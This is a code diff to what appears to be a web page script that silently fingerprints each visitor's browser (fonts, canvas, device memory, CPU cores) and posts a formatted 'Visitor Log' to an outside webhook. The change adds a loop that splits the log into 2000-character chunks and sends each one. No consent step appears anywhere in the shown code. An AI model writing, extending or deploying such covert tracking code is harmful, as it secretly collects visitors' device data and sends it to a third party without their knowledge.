@@ -250,13 +250,14 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia'];
-            let fontList = [];
+            let detectedFonts = [];
             fonts.forEach(font => {
-                ctx.font = `72px ${font}`;
-                const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-                fontList.push({ font, width });
+                ctx.font = `12px ${font}`;
+                const text = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                const width = ctx.measureText(text).width;
+                detectedFonts.push({ font, width });
             });
-            return fontList;
+            return detectedFonts;
         }
 
         function getCanvasFingerprint() {
@@ -295,6 +296,7 @@
                 const memory = getDeviceMemory();
                 const concurrency = getHardwareConcurrency();
 
+                const payloads = [];
                 const payload = {
                     content: `**Visitor Log**\n\n` +
                      `🗓️ **Date and Time:** ${new Date().toISOString()}\n` +
@@ -316,13 +318,24 @@
                      `🖋️ **Fonts Detected:** ${fonts.map(f => f.font).join(', ')}\n`
                 };
 
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
+                const payloadText = payload.content;
+
+                // Split the payload into chunks if it's too large
+                const maxLength = 2000;
+                for (let i = 0; i < payloadText.length; i += maxLength) {
+                    payloads.push({ content: payloadText.substring(i, i + maxLength) });
+                }
+
+                // Send payloads
+                for (const payloadPart of payloads) {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payloadPart)
+                    });
+                }
 
             } catch (error) {
                 console.error('Error logging visitor:', error);
